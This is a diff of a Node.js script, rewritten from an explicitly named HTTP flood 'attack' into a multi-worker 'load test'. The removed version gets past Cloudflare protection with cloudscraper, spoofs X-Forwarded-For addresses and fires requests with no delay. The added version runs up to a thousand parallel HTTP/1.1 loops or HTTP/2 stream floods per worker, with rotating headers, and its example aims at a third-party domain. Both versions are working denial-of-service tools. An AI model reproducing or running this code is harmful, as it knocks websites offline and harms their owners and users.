@@ -1,118 +1,148 @@
-// team_max_speed.js
-// Usage: node team_max_speed.js <url> <time>
-// Example: node team_max_speed.js http://example.com 60
+// ultrafast-hybrid.js
+// Usage:
+// node ultrafast-hybrid.js <url> <durationSec> <workers> <protocol h1|h2>
+// Example: node ultrafast-hybrid.js https://fastyl.net/ 60 20 h1
 
-const cloudscraper = require('cloudscraper');
-const request = require('request');
-const randomstring = require("randomstring");
+const cluster = require("cluster");
+const os = require("os");
+const http = require("http");
+const https = require("https");
+const http2 = require("http2");
+const { URL } = require("url");
 
-// --- Helper Functions ---
+// ===== Random Headers / User-Agent =====
+function pick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
 
-// Generates a random byte for a fake IP address component
-const randomByte = function() {
-    return Math.round(Math.random() * 256);
-};
-
-// --- Command Line Setup ---
-
-if (process.argv.length <= 3) {
-    console.log("Usage: node team_max_speed.js <url> <time>");
-    console.log("Example: node team_max_speed.js http://example.com 60");
-    process.exit(-1);
+function randomUserAgent() {
+  const iosVersions = ["16_0","16_6","17_0","17_1"];
+  const safariVersions = ["604.1","605.1.15","606.4.5"];
+  const chromeVersions = ["122.0.0.0","123.0.6312.86","124.0.6367.78"];
+  const firefoxVersions = ["122.0","123.0","124.0"];
+  const androidDevices = ["Pixel 7 Pro","Samsung Galaxy S23","OnePlus 11"];
+  const agents = [
+    ()=>`Mozilla/5.0 (iPhone; CPU iPhone OS ${pick(iosVersions)} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/${pick(safariVersions)}`,
+    ()=>`Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${pick(chromeVersions)} Safari/537.36`,
+    ()=>`Mozilla/5.0 (Linux; Android 14; ${pick(androidDevices)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${pick(chromeVersions)} Mobile Safari/537.36`,
+    ()=>`Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${pick(firefoxVersions)}) Gecko/20100101 Firefox/${pick(firefoxVersions)}`
+  ];
+  return pick(agents)();
 }
 
-const url = process.argv[2];
-const time = parseInt(process.argv[3]);
-const endTime = Date.now() + (time * 1000);
+function randomHeaders(proto="h2") {
+  const headers = {
+    "User-Agent": randomUserAgent(),
+    "Accept": pick(["*/*","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"]),
+    "Accept-Language": pick(["en-US,en;q=0.9","en-GB,en;q=0.8","fr-FR,fr;q=0.9,en;q=0.8"]),
+    "Accept-Encoding": pick(["gzip, deflate, br","gzip, br"]),
+    "Upgrade-Insecure-Requests":"1"
+  };
+  if(proto==="h1") headers["Connection"]="keep-alive";
+  return headers;
+}
 
-let attackLoop = null; 
+// ===== Master Process =====
+if(cluster.isPrimary){
+  const [,, url, duration, workers, protocol] = process.argv;
+  if(!url||!duration){
+    console.log("Usage: node ultrafast-hybrid.js <url> <durationSec> <workers> <protocol h1|h2>");
+    process.exit(1);
+  }
 
-// --- Attack Logic (Max Speed and Randomized Identity) ---
+  const dur = parseInt(duration);
+  const numWorkers = parseInt(workers) || os.cpus().length;
+  const proto = protocol || "h1";
 
-// 1. Get the initial Cloudflare bypass token (cookie/user-agent) only ONCE.
-cloudscraper.get(url, function(error, response, body) {
-    if (error) {
-        console.error('Error fetching initial bypass token, exiting:', error.message);
-        process.exit(1);
-    }
+  console.log(`🚀 Ultra-Fast Hybrid Load Test
+Target: ${url}
+Duration: ${dur}s
+Workers: ${numWorkers}
+Protocol: ${proto}`);
 
-    let initialCookie = '';
-    let initialUserAgent = '';
+  let totalRequests=0, totalBytes=0;
 
-    // Safely extract the headers
-    try {
-        const parsed = JSON.parse(JSON.stringify(response));
-        initialCookie = parsed["request"]["headers"]["cookie"] || '';
-        initialUserAgent = parsed["request"]["headers"]["User-Agent"] || '';
-    } catch (e) {
-        console.warn('Warning: Failed to parse Cloudscraper response, using empty headers.');
-    }
+  for(let i=0;i<numWorkers;i++){
+    const worker = cluster.fork({ URL: url, DURATION: dur, PROTO: proto });
+    worker.on("message", msg=>{
+      totalRequests += msg.requests||0;
+      totalBytes += msg.bytes||0;
+    });
+  }
 
-    console.log(`Starting MAX SPEED load test on ${url} for ${time}s.`);
+  setTimeout(()=>{
+    for(const id in cluster.workers) cluster.workers[id].kill();
+    console.log("\n=== Results ===");
+    console.log("✅ Total Requests:",totalRequests);
+    console.log("📦 Total Data:",(totalBytes/1024/1024).toFixed(2),"MB");
+    console.log("⚡ Req/sec:",(totalRequests/dur).toFixed(2));
+    console.log("⚡ MB/sec:",((totalBytes/dur)/1024/1024).toFixed(2));
+    process.exit(0);
+  }, dur*1000 + 1000);
 
-    // 2. Define the main, high-speed, randomized attack function
-    function fireRequest() {
-        if (Date.now() >= endTime) {
-            console.log("Time limit reached. Stopping requests.");
-            return;
-        }
+} else {
+  // ===== Worker Process =====
+  const target = new URL(process.env.URL);
+  const dur = parseInt(process.env.DURATION);
+  const proto = process.env.PROTO;
 
-        // Generate per-request randomized headers (the human identity factor)
-        const rand = randomstring.generate({
-            length: 10,
-            charset: 'abcdefghijklmnopqstuvwxyz0123456789'
+  let requests=0, bytes=0;
+
+  if(proto==="h1"){
+    const mod = target.protocol==="https:"?https:http;
+    const agent = new mod.Agent({ keepAlive:true, maxSockets:1000 });
+
+    function fire(){
+      const start=Date.now();
+      const req = mod.request({
+        hostname: target.hostname,
+        port: target.port,
+        path: target.pathname,
+        method:"GET",
+        headers: randomHeaders("h1"),
+        agent: agent
+      }, res=>{
+        res.on("data", chunk=>{ bytes+=chunk.length; });
+        res.on("end", ()=>{
+          requests++;
+          fire();
         });
-        const ip = randomByte() + '.' + randomByte() + '.' + randomByte() + '.' + randomByte();
-
-        const options = {
-            url: url,
-            headers: {
-                // Use the valid, single-fetch User-Agent
-                'User-Agent': initialUserAgent, 
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-                'Upgrade-Insecure-Requests': '1',
-                // Use the valid, single-fetch Cookie
-                'cookie': initialCookie,
-                // These headers are randomized per request to look like a new user/session
-                'Origin': 'http://' + rand + '.com',
-                'Referer': 'http://google.com/' + rand,
-                'X-Forwarded-For': ip, // Common technique to vary apparent source IP
-                'Cache-Control': 'no-cache',
-            },
-            // CRUCIAL FOR UNICITY: Forces a new TCP socket for almost every request.
-            agent: false, 
-        };
-
-        // Send the final request
-        request(options, (error, response, body) => {
-            if (error) {
-                // Ignore request errors to maintain speed
-            } else if (response.statusCode >= 400 && response.statusCode !== 503) {
-                // console.log(`Warning: Received status code ${response.statusCode}`);
-            }
-        });
-
-        // 3. Loop instantly (0ms delay) for maximum possible speed (RPS).
-        attackLoop = setTimeout(fireRequest, 0);
+      });
+      req.on("error", ()=>fire()); // retry on error
+      req.end();
     }
-    
-    // 4. Start the attack
-    fireRequest();
-});
 
+    for(let i=0;i<1000;i++) fire(); // parallel loops
+  }
+  else if(proto==="h2"){
+    const SESSIONS_PER_WORKER = 3;       // multiple HTTP/2 clients
+    const STREAMS_PER_SESSION = 20;      // concurrent streams per client
 
-// --- Error Handling and Cleanup ---
+    const clients = [];
+    for(let s=0; s<SESSIONS_PER_WORKER; s++){
+      const client = http2.connect(target.origin);
+      client.on("error", ()=>{}); // ignore connection-level errors
+      clients.push(client);
+    }
 
-// Gracefully stop the attack when the time limit hits (redundant but safe)
-setTimeout(() => {
-    if (attackLoop) clearTimeout(attackLoop);
-}, time * 1000);
+    function fireH2(client){
+      const req = client.request({ ":path": target.pathname, ...randomHeaders("h2") });
+      req.on("data", chunk=>{ bytes+=chunk.length; });
+      req.on("end", ()=>{
+        requests++;
+        fireH2(client);
+      });
+      req.on("error", ()=>setTimeout(()=>fireH2(client),10)); // retry after 10ms
+      req.end();
+    }
 
-// Ignore uncaught errors to prevent the script from crashing immediately
-process.on('uncaughtException', function(err) {
-    // Silent fail
-});
+    clients.forEach(client=>{
+      for(let i=0;i<STREAMS_PER_SESSION;i++) fireH2(client);
+    });
 
-process.on('unhandledRejection', function(err) {
-    // Silent fail
-});
+    setTimeout(()=>clients.forEach(c=>c.close()), dur*1000);
+  }
+
+  setTimeout(()=>{
+    process.send({ requests, bytes });
+    process.exit(0);
+  }, dur*1000);
+}
